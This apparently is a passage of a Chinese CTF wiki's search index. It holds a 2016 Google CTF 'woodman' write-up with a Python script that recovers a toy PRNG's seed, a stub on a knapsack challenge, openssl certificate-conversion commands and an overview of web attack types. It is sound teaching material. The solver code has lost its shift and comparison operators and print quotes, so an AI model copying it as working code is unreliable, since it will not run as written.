\u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002\n\n\n\u5f85\u5b8c\u6210\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman\n\n\nhttp://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/crypto/prng/problem/#_1", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/prng/problem/#2016-google-ctf-woodman", 
            "text": "\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b  class   SecurePrng ( object ): \n     def   __init__ ( self ): \n         # generate seed with 64 bits of entropy \n         self . p   =   4646704883L \n         self . x   =   random . randint ( 0 ,   self . p ) \n         self . y   =   random . randint ( 0 ,   self . p ) \n\n     def   next ( self ): \n         self . x   =   ( 2   *   self . x   +   3 )   %   self . p \n         self . y   =   ( 3   *   self . y   +   9 )   %   self . p \n         return   ( self . x   ^   self . y )   \u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002  \u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002  \u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c \uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf   a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002  a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002  a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002  a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002  a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002   \u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002  \u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b   \u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002  \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e \u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d \u3002  \u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002  \u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002   \u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b  import   os  import   random  from   itertools   import   product  class   SecurePrng ( object ): \n     def   __init__ ( self ,   x =- 1 ,   y =- 1 ): \n         # generate seed with 64 bits of entropy \n         self . p   =   4646704883L    # 33bit \n         if   x   ==   - 1 : \n             self . x   =   random . randint ( 0 ,   self . p ) \n         else : \n             self . x   =   x \n         if   y   ==   - 1 : \n             self . y   =   random . randint ( 0 ,   self . p ) \n         else : \n             self . y   =   y \n\n     def   next ( self ): \n         self . x   =   ( 2   *   self . x   +   3 )   %   self . p \n         self . y   =   ( 3   *   self . y   +   9 )   %   self . p \n         return   ( self . x   ^   self . y )  def   getbiti ( num ,   idx ): \n     return   bin ( num )[ - idx   -   1 :]  def   main (): \n     sp   =   SecurePrng () \n     targetx   =   sp . x \n     targety   =   sp . y \n     print   we would like to get x  ,   targetx \n     print   we would like to get y  ,   targety \n\n     # suppose we have already guess two number \n     guess1   =   sp . next () \n     guess2   =   sp . next () \n\n     p   =   4646704883 \n\n     # newx = tmpx*2+3-kx*p \n     for   kx ,   ky   in   product ( range ( 3 ),   range ( 4 )): \n         candidate   =   [[ 0 ]] \n         # only 33 bit \n         for   i   in   range ( 33 ): \n             #print  idx  , i \n             new_candidate   =   [] \n             for   old ,   bit   in   product ( candidate ,   range ( 2 )): \n                 #print old, bit \n                 oldx   =   old [ 0 ] \n                 #oldy = old[1] \n                 tmpx   =   oldx   |   (( bit     1 )     i ) \n                 #tmpy = oldy | ((bit / 2)   i) \n                 tmpy   =   tmpx   ^   guess1 \n                 newx   =   tmpx   *   2   +   3   -   kx   *   p   +   ( 1     40 ) \n                 newy   =   tmpy   *   3   +   9   -   ky   *   p   +   ( 1     40 ) \n                 tmp1   =   newx   ^   newy \n                 #print  tmpx:     , bin(tmpx) \n                 #print  targetx:  , bin(targetx) \n                 #print  calculate:      , bin(tmp1 + (1   40)) \n                 #print  target guess2:  , bin(guess1 + (1   40)) \n                 if   getbiti ( guess2   +   ( 1     40 ),   i )   ==   getbiti ( \n                         tmp1   +   ( 1     40 ),   i ): \n                     if   [ tmpx ]   not   in   new_candidate : \n                         #print  got one \n                         #print bin(tmpx) \n                         #print bin(targetx) \n                         #print bin(tmpy) \n                         new_candidate . append ([ tmpx ]) \n             candidate   =   new_candidate \n             #print len(candidate) \n             #print candidate \n         print   candidate x for kx:  ,   kx ,    ky  ,   ky \n         for   item   in   candidate : \n             tmpx   =   candidate [ 0 ][ 0 ] \n             tmpy   =   tmpx   ^   guess1 \n             if   tmpx   =   p   or   tmpx   =   p : \n                 continue \n             mysp   =   SecurePrng ( tmpx ,   tmpy ) \n             tmp1   =   mysp . next () \n             if   tmp1   !=   guess2 : \n                 continue \n             print   tmpx ,   tmpy \n             print ( targetx   *   2   +   3 )   %   p ,   ( targety   *   3   +   9 )   %   p  if   __name__   ==   __main__ : \n     main ()", 
            "title": "2016 Google CTF woodman"
        }, 
        {
            "location": "/crypto/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem", 
            "text": "\u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b  Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a\nwhere b_1 + b_2 + ... + b_K = 0.\n\nInput Format: N a_1 a_2 ... a_N\nAnswer Format: K b_1 b_2 ... b_K\n\nExample Input:\n4 -8 -2 3 5\nExample Answer:\n3 -8 3 5  \u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002  \u5f85\u5b8c\u6210", 
            "title": "2017 Tokyo Westerns CTF 3rd Backpacker's Problem"
        }, 
        {
            "location": "/crypto/prng/problem/#_2", 
            "text": "https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman  http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/crypto/certificate/introduction/", 
            "text": "\u8bc1\u4e66\u683c\u5f0f\n\n\nDER\n\n\n\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528\n\u4e8c\u8fdb\u5236\u7f16\u7801\n\uff0c\u5f53\u7136\uff0c\u8fd9\u4e9b\u8bc1\u4e66\u4e5f\u53ef\u4ee5\u4f7f\u7528 CER \u6216\u8005 CRT \u4f5c\u4e3a\u6269\u5c55\u540d\u3002\n\n\nPEM\n\n\n\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 Base64 \u7f16\u7801\uff0c\u6587\u4ef6\u7684\u5f00\u59cb\u662f\u4e00\u884c \n-----BEGIN\n\u3002\n\n\n\u683c\u5f0f\u8f6c\u6362\n\n\nopenssl x509 -outform der -in certificate.pem -out certificate.der\nopenssl x509 -inform der -in certificate.cer -out certificate.pem", 
            "title": "\u8bc1\u4e66\u683c\u5f0f"
        }, 
        {
            "location": "/crypto/certificate/introduction/#_1", 
            "text": "", 
            "title": "\u8bc1\u4e66\u683c\u5f0f"
        }, 
        {
            "location": "/crypto/certificate/introduction/#der", 
            "text": "\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 \u4e8c\u8fdb\u5236\u7f16\u7801 \uff0c\u5f53\u7136\uff0c\u8fd9\u4e9b\u8bc1\u4e66\u4e5f\u53ef\u4ee5\u4f7f\u7528 CER \u6216\u8005 CRT \u4f5c\u4e3a\u6269\u5c55\u540d\u3002", 
            "title": "DER"
        }, 
        {
            "location": "/crypto/certificate/introduction/#pem", 
            "text": "\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 Base64 \u7f16\u7801\uff0c\u6587\u4ef6\u7684\u5f00\u59cb\u662f\u4e00\u884c  -----BEGIN \u3002", 
            "title": "PEM"
        }, 
        {
            "location": "/crypto/certificate/introduction/#_2", 
            "text": "openssl x509 -outform der -in certificate.pem -out certificate.der\nopenssl x509 -inform der -in certificate.cer -out certificate.pem", 
            "title": "\u683c\u5f0f\u8f6c\u6362"
        }, 
        {
            "location": "/web/introduction/", 
            "text": "\u968f\u7740 WEB 2.0\u3001\u793e\u4ea4\u7f51\u7edc\u3001\u5fae\u535a\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u578b\u7684\u4e92\u8054\u7f51\u4ea7\u54c1\u7684\u8bde\u751f\uff0c\u57fa\u4e8e WEB \u73af\u5883\u7684\u4e92\u8054\u7f51\u5e94\u7528\u8d8a\u6765\u8d8a\u5e7f\u6cdb\uff0c\u4f01\u4e1a\u4fe1\u606f\u5316\u7684\u8fc7\u7a0b\u4e2d\u5404\u79cd\u5e94\u7528\u90fd\u67b6\u8bbe\u5728 WEB \u5e73\u53f0\u4e0a\uff0cWEB \u4e1a\u52a1\u7684\u8fc5\u901f\u53d1\u5c55\u4e5f\u5f15\u8d77\u9ed1\u5ba2\u4eec\u7684\u5f3a\u70c8\u5173\u6ce8\uff0c\u63a5\u8e35\u800c\u81f3\u7684\u5c31\u662f WEB \u5b89\u5168\u5a01\u80c1\u7684\u51f8\u663e\uff0c\u9ed1\u5ba2\u5229\u7528\u7f51\u7ad9\u64cd\u4f5c\u7cfb\u7edf\u7684\u6f0f\u6d1e\u548c WEB \u670d\u52a1\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f97\u5230 WEB \u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u91cd\u8981\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7f51\u7ad9\u8bbf\u95ee\u8005\u53d7\u5230\u4fb5\u5bb3\u3002\n\n\n\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cWEB \u4e5f\u662f\u5360\u6bd4\u91cd\u5f88\u5927\u7684\u4e00\u4e2a\u65b9\u5411\u4e4b\u4e00\uff0cWEB \u7c7b\u7684\u9898\u76ee\u79cd\u7c7b\u7e41\u591a\uff0c\u77e5\u8bc6\u70b9\u7ec6\u788e\uff0c\u65f6\u6548\u6027\u5f3a\uff0c\u80fd\u7d27\u8ddf\u65f6\u4e0b\u70ed\u70b9\u6f0f\u6d1e\uff0c\u8d34\u8fd1\u5b9e\u6218\u3002\n\n\nWEB \u7c7b\u7684\u9898\u76ee\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aSQL \u6ce8\u5165\u3001XSS \u8de8\u7ad9\u811a\u672c\u3001CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u6587\u4ef6\u5305\u542b\u3001\u6846\u67b6\u5b89\u5168\u3001PHP \u5e38\u89c1\u6f0f\u6d1e\u3001\u4ee3\u7801\u5ba1\u8ba1\u7b49\u3002\n\n\nSQL \u6ce8\u5165\n\n\n\u901a\u8fc7\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\u4e2d\u6ce8\u5165 SQL \u8bed\u6cd5\uff0c\u7834\u574f\u539f\u6709 SQL \u7ed3\u6784\uff0c\u8fbe\u5230\u7f16\u5199\u7a0b\u5e8f\u65f6\u610f\u6599\u4e4b\u5916\u7ed3\u679c\u7684\u653b\u51fb\u884c\u4e3a\u3002\u5176\u6210\u56e0\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e24\u4e2a\u539f\u56e0\u53e0\u52a0\u9020\u6210\u7684\uff1a\n\n\n\n\n\u7a0b\u5e8f\u7f16\u5199\u8005\u5728\u5904\u7406\u5e94\u7528\u7a0b\u5e8f\u548c\u6570\u636e\u5e93\u4ea4\u4e92\u65f6\uff0c\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020 SQL \u8bed\u53e5\n\n\n\u672a\u5bf9\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u8db3\u591f\u7684\u8fc7\u6ee4\u4fbf\u5c06\u53c2\u6570\u5185\u5bb9\u62fc\u63a5\u8fdb\u5165\u5230 SQL \u8bed\u53e5\u4e2d\n\n\n\n\nXSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb\n\n\n\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002\u6076\u610f\u653b\u51fb\u8005\u5f80 WEB \u9875\u9762\u91cc\u63d2\u5165\u6076\u610f HTML \u4ee3\u7801\uff0c\u5f53\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u4e4b\u65f6\uff0c\u5d4c\u5165\u5176\u4e2d Web \u91cc\u9762\u7684 HTML \u4ee3\u7801\u4f1a\u88ab\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u7279\u6b8a\u76ee\u7684\u3002\n\n\n\u547d\u4ee4\u6267\u884c\n\n\n\u5f53\u5e94\u7528\u9700\u8981\u8c03\u7528\u4e00\u4e9b\u5916\u90e8\u7a0b\u5e8f\u53bb\u5904\u7406\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4f1a\u7528\u5230\u4e00\u4e9b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\u3002\u5982 PHP \u4e2d\u7684 \nsystem\n\u3001\nexec\n\u3001\nshell_exec\n \u7b49\uff0c\u5f53\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\uff0c\u5c06\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7cfb\u7edf\u547d\u4ee4\u5230\u6b63\u5e38\u547d\u4ee4\u4e2d\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u8fd8\u662f\u4e3b\u8981\u4ee5 PHP \u4e3a\u4e3b\u4ecb\u7ecd\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0cJava \u7b49\u5e94\u7528\u7684\u7ec6\u8282\u5f85\u8865\u5145\u3002\n\n\n\u6587\u4ef6\u5305\u542b\n\n\n\u5982\u679c\u5141\u8bb8\u5ba2\u6237\u7aef\u7528\u6237\u8f93\u5165\u63a7\u5236\u52a8\u6001\u5305\u542b\u5728\u670d\u52a1\u5668\u7aef\u7684\u6587\u4ef6\uff0c\u4f1a\u5bfc\u81f4\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u53ca\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u4e3b\u8981\u5305\u62ec\u672c\u5730\u6587\u4ef6\u5305\u542b\u548c\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u4e24\u79cd\u5f62\u5f0f\u3002\n\n\nCSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\n\n\n\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08Cross-Site Request Forgery\uff0cCSRF\uff09\u662f\u4e00\u79cd\u4f7f\u5df2\u767b\u5f55\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u67d0\u79cd\u52a8\u4f5c\u7684\u653b\u51fb\u3002\u56e0\u4e3a\u653b\u51fb\u8005\u770b\u4e0d\u5230\u4f2a\u9020\u8bf7\u6c42\u7684\u54cd\u5e94\u7ed3\u679c\uff0c\u6240\u4ee5 CSRF \u653b\u51fb\u4e3b\u8981\u7528\u6765\u6267\u884c\u52a8\u4f5c\uff0c\u800c\u975e\u7a83\u53d6\u7528\u6237\u6570\u636e\u3002\u5f53\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u666e\u901a\u7528\u6237\u65f6\uff0cCSRF \u53ef\u4ee5\u5b9e\u73b0\u5728\u5176\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u8f6c\u79fb\u7528\u6237\u8d44\u91d1\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\u64cd\u4f5c\uff1b\u4f46\u662f\u5982\u679c\u53d7\u5bb3\u8005\u662f\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7528\u6237\u65f6 CSRF \u5219\u53ef\u80fd\u5a01\u80c1\u5230\u6574\u4e2a WEB \u7cfb\u7edf\u7684\u5b89\u5168\u3002\n\n\nSSRF \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\n\n\nSSRF\uff08Server-Side Request Forgery\uff1a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002\n\n\n\u6587\u4ef6\u4e0a\u4f20\n\n\n\u5728\u7f51\u7ad9\u7684\u8fd0\u8425\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u8981\u5bf9\u7f51\u7ad9\u7684\u67d0\u4e9b\u9875\u9762\u6216\u8005\u5185\u5bb9\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u65f6\u4fbf\u9700\u8981\u4f7f\u7528\u5230\u7f51\u7ad9\u7684\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u5982\u679c\u4e0d\u5bf9\u88ab\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236\u6216\u8005\u9650\u5236\u88ab\u7ed5\u8fc7\uff0c\u8be5\u529f\u80fd\u4fbf\u6709\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u4e8e\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u3001\u811a\u672c\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u8fdb\u800c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u670d\u52a1\u5668\u6ca6\u9677\u3002\n\n\n\u70b9\u51fb\u52ab\u6301\n\n\nClickjacking\uff08\u70b9\u51fb\u52ab\u6301\uff09\u662f\u7531\u4e92\u8054\u7f51\u5b89\u5168\u4e13\u5bb6\u7f57\u4f2f\u7279\u00b7\u6c49\u68ee\u548c\u8036\u5229\u7c73\u00b7\u683c\u52b3\u65af\u66fc\u5728 2008 \u5e74\u9996\u521b\u7684\u3002\n\n\n\u662f\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u624b\u6bb5\uff0c\u5728 WEB \u7aef\u5c31\u662f iframe \u5d4c\u5957\u4e00\u4e2a\u900f\u660e\u4e0d\u53ef\u89c1\u7684\u9875\u9762\uff0c\u8ba9\u7528\u6237\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u653b\u51fb\u8005\u60f3\u8981\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u7684\u4f4d\u7f6e\u3002\n\n\n\u7531\u4e8e\u70b9\u51fb\u52ab\u6301\u7684\u51fa\u73b0\uff0c\u4fbf\u51fa\u73b0\u4e86\u53cd frame \u5d4c\u5957\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u70b9\u51fb\u52ab\u6301\u9700\u8981 iframe \u5d4c\u5957\u9875\u9762\u6765\u653b\u51fb\u3002\n\n\n\u4e0b\u9762\u4ee3\u7801\u662f\u6700\u5e38\u89c1\u7684\u9632\u6b62 frame \u5d4c\u5957\u7684\u4f8b\u5b50\uff1a\n\n\nif\n(\ntop\n.\nlocation\n!=\nlocation\n)\n\n    \ntop\n.\nlocation\n=\nself\n.\nlocation\n;\n\n\n\n\n\nVPS \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\n\n\nVPS\uff08Virtual Private Server \u865a\u62df\u4e13\u7528\u670d\u52a1\u5668\uff09\u6280\u672f\uff0c\u5c06\u4e00\u90e8\u670d\u52a1\u5668\u5206\u5272\u6210\u591a\u4e2a\u865a\u62df\u4e13\u4eab\u670d\u52a1\u5668\u7684\u4f18\u8d28\u670d\u52a1\u3002\u5b9e\u73b0 VPS \u7684\u6280\u672f\u5206\u4e3a\u5bb9\u5668\u6280\u672f\uff0c\u548c\u865a\u62df\u5316\u6280\u672f\u3002\u5728\u5bb9\u5668\u6216\u865a\u62df\u673a\u4e2d\uff0c\u6bcf\u4e2a VPS \u90fd\u53ef\u5206\u914d\u72ec\u7acb\u516c\u7f51 IP \u5730\u5740\u3001\u72ec\u7acb\u64cd\u4f5c\u7cfb\u7edf\u3001\u5b9e\u73b0\u4e0d\u540c VPS \u95f4\u78c1\u76d8\u7a7a\u95f4\u3001\u5185\u5b58\u3001CPU \u8d44\u6e90\u3001\u8fdb\u7a0b\u548c\u7cfb\u7edf\u914d\u7f6e\u7684\u9694\u79bb\uff0c\u4e3a\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\u6a21\u62df\u51fa\u72ec\u5360\u4f7f\u7528\u8ba1\u7b97\u8d44\u6e90\u7684\u4f53\u9a8c\u3002VPS \u53ef\u4ee5\u50cf\u72ec\u7acb\u670d\u52a1\u5668\u4e00\u6837\uff0c\u91cd\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5355\u72ec\u91cd\u542f\u670d\u52a1\u5668\u3002VPS \u4e3a\u4f7f\u7528\u8005\u63d0\u4f9b\u4e86\u7ba1\u7406\u914d\u7f6e\u7684\u81ea\u7531\uff0c\u53ef\u7528\u4e8e\u4f01\u4e1a\u865a\u62df\u5316\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e IDC \u8d44\u6e90\u79df\u7528\u3002\n\n\nIDC \u8d44\u6e90\u79df\u7528\uff0c\u7531 VPS \u63d0\u4f9b\u5546\u63d0\u4f9b\u3002\u4e0d\u540c VPS \u63d0\u4f9b\u5546\u6240\u4f7f\u7528\u7684\u786c\u4ef6 VPS \u8f6f\u4ef6\u7684\u5dee\u5f02\uff0c\u53ca\u9500\u552e\u7b56\u7565\u7684\u4e0d\u540c\uff0cVPS \u7684\u4f7f\u7528\u4f53\u9a8c\u4e5f\u6709\u8f83\u5927\u5dee\u5f02\u3002\u5c24\u5176\u662f VPS \u63d0\u4f9b\u5546\u8d85\u5356\uff0c\u5bfc\u81f4\u5b9e\u4f53\u670d\u52a1\u5668\u8d85\u8d1f\u8377\u65f6\uff0cVPS 